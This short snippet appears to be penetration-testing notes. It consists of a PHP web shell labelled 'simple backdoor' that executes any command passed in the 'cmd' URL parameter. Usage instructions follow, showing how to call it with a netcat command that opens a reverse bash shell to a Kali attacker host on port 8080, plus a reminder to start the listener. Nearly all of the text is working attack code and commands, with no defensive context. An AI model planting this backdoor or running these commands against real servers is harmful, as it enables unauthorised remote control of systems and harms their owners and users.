<?php
// simple backdoor
system($_GET['cmd']);
?>

# in the url after the simple_backdoor.php use below

# ?cmd=nc kali_ip 8080 -e /bin/bash

or bash, pearl etc. Start the nc listener on kali
